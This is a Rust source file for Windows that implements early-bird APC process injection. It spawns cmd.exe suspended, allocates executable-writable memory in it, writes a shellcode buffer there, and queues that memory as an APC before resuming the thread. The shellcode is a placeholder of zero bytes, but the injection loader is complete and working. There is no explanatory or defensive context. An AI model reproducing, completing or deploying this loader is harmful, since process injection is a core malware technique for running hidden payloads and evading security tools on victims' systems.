use std::mem::{size_of, transmute};
use windows::{
    Win32::{
        Foundation::{CloseHandle, GetLastError, PAPCFUNC},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
            Threading::{
                CREATE_SUSPENDED, CreateProcessW, PROCESS_INFORMATION, QueueUserAPC, ResumeThread,
                STARTF_USESHOWWINDOW, STARTUPINFOW,
            },
        },
    },
    core::{Error, HRESULT, Result, w},
};

fn main() -> Result<()> {
    let shellcode: [u8; 460] = [0x00; 460];

    unsafe {
        let mut s_info = STARTUPINFOW::default();
        s_info.cb = size_of::<STARTUPINFOW>() as u32;
        s_info.dwFlags = STARTF_USESHOWWINDOW;

        let mut p_info = PROCESS_INFORMATION::default();

        CreateProcessW(
            w!("C:\\Windows\\System32\\cmd.exe"),
            None,
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            w!("C:\\Windows\\System32"),
            &s_info,
            &mut p_info,
        )?;

        let h_memory = VirtualAllocEx(
            p_info.hProcess,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if h_memory.is_null() {
            CloseHandle(p_info.hThread)?;
            CloseHandle(p_info.hProcess)?;
            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
        }

        let mut bytes_written: usize = 0;
        WriteProcessMemory(
            p_info.hProcess,
            h_memory,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            Some(&mut bytes_written),
        )?;

        let papc_func: PAPCFUNC = transmute(h_memory);
        if QueueUserAPC(papc_func, p_info.hThread, 0) == 0 {
            CloseHandle(p_info.hThread)?;
            CloseHandle(p_info.hProcess)?;
            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
        }

        let r_thread = ResumeThread(p_info.hThread);
        if r_thread == u32::MAX {
            CloseHandle(p_info.hThread)?;
            CloseHandle(p_info.hProcess)?;
            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
        }

        CloseHandle(p_info.hThread)?;
        CloseHandle(p_info.hProcess)?;
    };

    Ok(())
}
